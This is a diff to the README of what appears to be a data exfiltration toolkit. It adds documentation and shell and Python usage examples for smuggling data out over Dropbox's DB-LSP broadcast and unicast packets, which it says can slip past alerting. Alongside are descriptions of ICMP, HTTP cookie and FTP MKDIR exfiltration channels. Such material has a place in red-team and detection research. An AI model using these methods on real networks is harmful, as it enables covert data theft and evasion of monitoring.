@@ -11,9 +11,10 @@ This started as a PoC project but has later turned into something a bit more. Cu
   * BGP Open.
   * HTTPS Replace Certificate.
   * QUIC - No Certificate.
-  * Slack Exfiltration
+  * Slack Exfiltration.
   * POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
   * FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
+  * DB-LSP (Broadcast or Unicast).
 * Physical
   * Audio
   * QR Codes
@@ -116,6 +117,52 @@ Exfiltration of files over HTTP protocol but over the Cookies field. The strong 
 
 ### ICMP
 Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.
+
+### DB_LSP
+Dropbox uses UDP broadcast packets to identify other Dropbox instances on the LAN and sync files between them. This exfiltration method can work in one out of two scenarios:
+  * Unicast exfiltration - sending the data over DB-LSP packets to your server.
+  * LAN Broadcast communication - assuming you're on the same LAN you can configure a listener and a sender to communicate over broadcast, masking the sender and receiver and in a way that might surpass some alerting mechnisms as there is "no direct connection" between them.
+
+#### Shell Mode
+```bash
+$ sudo python dblsp.py
+
+    To communicate between two hosts over broadcast you will need:
+    	1) Setup an ecnryption key whichi will be identical on both hosts.
+    		set key 123456
+    	2) Know which host is going to broadcast the message:
+    		set listener 10.0.0.1
+    	3) Start active mode:
+    		active 10.0.0.255
+
+    Now just send messages with:
+    	send "hello world"
+
+
+DB_LSP > set key 123456
+ key --> 123456.
+DB_LSP > set listener 10.0.0.2
+ listener --> 10.0.0.2.
+DB_LSP > active 10.0.0.255
+Starting active mode with 10.0.0.255.
+Starting listener for 10.0.0.2.
+10.0.0.255@DB_LSP > send hello
+184 bytes sent to ('10.0.0.255', 17500).
+10.0.0.255@DB_LSP >
+```
+Please notice that the `listener` is the IP from which you're expecting to get the message. This is so that when you get a broadcast you know which one to decode and understand. `active` will point to which IP address to send the UDP packets. Use a `.255` address for broadcast or a specific IP for unicast.
+
+#### 'API'
+##### Constant Sniff and Decode :
+```python
+SniffAndDecode(key="123456", host="OtherIP", port=17500)
+```
+
+##### Send a message:
+```python
+obj = DB_LSP(key="123456", data="Hello World", host="192.168.0.255", port=17500)
+obj.Send()
+```
 
 ### FTP MKDIR
 FTP MKDIR is a technique based on using an FTP server and assuming that the corporate is using an active MiTM to disable file upload. With this in mind, the file is then compressed using `zlib` and base64 encoded (to be ASCII representable) and then splitted into chunks. Each chunk is then made the name of a directory using MKDIR command (which is not a file upload and should be enabled).
